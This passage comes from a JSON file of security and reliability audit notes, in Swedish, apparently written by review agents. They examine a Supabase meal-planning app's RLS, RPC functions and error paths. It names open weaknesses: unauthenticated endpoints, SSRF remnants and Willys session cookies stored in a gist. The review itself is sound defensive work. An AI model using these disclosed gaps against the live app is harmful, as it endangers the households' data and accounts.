REALTIME (pg_publication_tables/supabase_realtime): endast family_lists + family_list_items publiceras, båda med RLS PÅ → ingen RLS-lös tabell exponeras via Realtime. FUNKTIONER/RPC: activate_plan_atomic (finns, driftad, matchar migration 001), touch_family_list_updated_at, touch_parent_family_list — alla SECURITY INVOKER, ingen SECURITY DEFINER-eskalering. Migrationer 001-006 stämmer mot driftade objekt (triggrar family_lists_touch + family_list_items_touch_parent finns implicit via funktionerna; icon/color-kolumner ej separat verifierade men schemat matchar). KÄNDA UNDANTAG ej rapporterade enligt instruktion: dispatch/willys-offers JWT (#5-6), SSRF-rest i import-recipe, getHouseholdId 'första hushållet' (#6), Willys-cookies i gist (#5). EJ granskat (utanför RLS-dimensionen): auth-konfiguration i Supabase-dashboarden (t.ex. om self-signup verkligen är avstängd på Auth-nivå — bör dubbelkollas separat inför M1), Storage-buckets/policies, samt api/-endpoints JWT-logik (annan granskares dimension)."
+  },
+  {
+   "finder": "fundament-felvagar",
+   "notes": "DIMENSION: Tyst-felande fundament / kärnflödenas felvägar. Läste hela api/generate.js, confirm.js, deals.js, willys-offers.js, dispatch-to-willys.js, api/_shared/{handler,supabase,alert,history,select-recipes}.js, db/migrations/001_activate_plan_atomic.sql, service-worker.js, js/weekly-plan/plan-viewer.js (läsvägar), js/today/today-view.js (banner). Verifierade mot live-DB via Management-API (läsande SQL): meal_days_pkey=(household_id,date), FK plan_id ON DELETE SET NULL, RPC activate_plan_atomic FINNS, RLS aktiv på meal_days/weekly_plans/recipe_history/pricing_status/shopping_lists/shopping_items.\\n\\nPUNKT-FÖR-PUNKT: (1) generate.js end-to-end — huvudfynd P1: upsert reassignar aktiv plans rader UTANFÖR den atomära aktiveringen; RPC-rollback undanröjer inte den redan committade omflyttningen → tom aktiv plan vid activatePlanAtomic-fel. UPSERT-fixen är TÄT mot PK-krock och mot custom-dagar (plan_id NULL utesluts i handlern rad 465 + mealDayRows innehåller dem aldrig — verifierat), men INTE mot den aktiva planens integritet under aktiveringsfönstret. Fallbacken kan lämna 0 aktiva planer bara om activatePlan(rad 219) själv failar efter att alla deaktiverats — smalt men möjligt (rapporterat indirekt via #8). (2) Maskningar: fetchExistingShoppingList (P1 dataförlust), fetchHistory (P2), saveHistory (P2), shopping-efter-aktivering (P2). (3) Willys-degradering: LIVE-vägen deals.js har noll larm; infrastrukturen sitter på dött optimize_prices (P1). Cookie-utgång i dispatch surfas korrekt (auth_expired → notifyAlert + svenskt UI-meddelande) — OK. (4) Dispatch delmängd surfas OK; dubbel-dispatch saknar idempotens (P2). (5) recipe_history: fönstret kan tyst nollas via ohanterat fetchHistory-fel (P2 #4) och tyst ej-skrivas (P2 #5); select-recipes har robust 5-stegs fallback som kastar begripligt fel FÖRE DB-skrivningar (säkert). (6) Service worker: JS-moduler är network-first (skew-skyddat vid online-deploy); kvarvarande skew-risk endast offline/flaky mid-load (dokumenterad Session 101) och generell klient/API-kontraktsskew vid mitt-i-session-deploy utan reload-banner — bedömd för svag/generisk för separat fynd.\\n\\nEJ RAPPORTERAT (enligt instruktion): dispatch/willys-offers saknar JWT (#5-6), SSRF-rester i import-recipe, getHouseholdId 'första hushållet' (#6), Willys-cookies i gist (#5). EJ DJUPGRANSKAT (annan dimension): cross-household RLS-policyernas korrekthet (bekräftade bara att RLS är PÅ), import-recipe/Gemini-flödet, replace-recipe/move-day/skip-day/swap-days felvägar (samma savePlan-mönster kan ärva #1-fyndet — värt uppföljning). READ-ONLY mot kod hållen; endast läsande SQL kördes."
+  }
+ ]
+}
